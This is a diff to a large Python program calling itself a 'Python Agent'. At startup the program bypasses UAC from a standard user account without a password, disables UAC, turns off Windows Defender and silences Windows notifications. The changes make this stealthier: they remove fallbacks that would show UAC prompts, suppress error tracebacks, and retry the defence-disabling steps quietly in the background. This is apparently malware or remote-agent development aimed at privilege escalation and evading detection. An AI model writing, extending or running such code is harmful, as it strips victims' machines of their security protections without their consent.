@@ -5324,10 +5324,17 @@ def run_as_admin():
         log_message("[!] Relaunching as Administrator...")
         try:
             # Relaunch with elevated privileges
-            ctypes.windll.shell32.ShellExecuteW(
+            result = ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, f'"{__file__}"', None, 1
             )
-            sys.exit()
+            # ShellExecuteW returns > 32 on success
+            if result > 32:
+                log_message("[!] Elevated instance launched successfully - original instance will exit")
+                time.sleep(2)  # Give elevated instance time to start
+                sys.exit(0)
+            else:
+                log_message(f"[!] User declined elevation or launch failed (code: {result})")
+                return False
         except (AttributeError, OSError):
             log_message("[!] Failed to relaunch as admin: Windows API not available")
             return False
@@ -12809,6 +12816,15 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Check if we're being imported by an elevated script (prevents recursive execution)
+    if os.environ.get('ELEVATED_MODE') == '1':
+        # We're in elevated mode - don't run main startup, just provide functions
+        print("[ELEVATED] Script loaded in elevated mode - functions available for import")
+        # DO NOT run the full startup sequence - the elevated script will import and call specific functions
+        # Exit immediately to prevent recursive execution
+        sys.exit(0)
+    
+    # Normal startup mode - proceed with full startup
     # Add startup banner before anything else
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
@@ -12849,6 +12865,7 @@ if __name__ == "__main__":
         print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
         print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
         print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
+        print("[STARTUP] NOTE: If UAC bypass fails, the agent will continue running normally")
         try:
             if bootstrap_uac_disable_no_admin():
                 print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
@@ -12856,16 +12873,17 @@ if __name__ == "__main__":
                 print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
                 print("[STARTUP] ✅ You can now run ANY application without password prompts!")
             else:
-                print("[STARTUP] ⚠️ Bootstrap failed - trying direct method...")
-                # Fallback to direct method
-                if silent_disable_uac():
-                    print("[STARTUP] ✅ UAC disabled using direct method")
-                else:
-                    print("[STARTUP] ⚠️ UAC disable failed - may need to run as administrator")
+                print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
+                print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
+                print("[STARTUP] ℹ️ UAC bypass will retry in background if needed")
+                # DO NOT try fallback methods that might cause UAC prompts
+                # Just continue running - the background thread will retry
         except Exception as e:
             print(f"[STARTUP] UAC disable error: {e}")
-            import traceback
-            traceback.print_exc()
+            print("[STARTUP] ℹ️ Agent will continue running normally")
+            # Don't print full traceback for UAC failures - it's expected
+            # import traceback
+            # traceback.print_exc()
         
         # 2. Disable Windows Defender
         print("\n[STARTUP] Step 2: Disabling Windows Defender...")
@@ -12873,9 +12891,9 @@ if __name__ == "__main__":
             if disable_defender():
                 print("[STARTUP] ✅ Windows Defender disabled successfully")
             else:
-                print("[STARTUP] ⚠️ Defender disable failed")
+                print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
         except Exception as e:
-            print(f"[STARTUP] Defender disable error: {e}")
+            print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
         
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
@@ -12883,9 +12901,9 @@ if __name__ == "__main__":
             if disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
             else:
-                print("[STARTUP] ⚠️ Notification disable failed")
+                print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
         except Exception as e:
-            print(f"[STARTUP] Notification disable error: {e}")
+            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
         
         print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
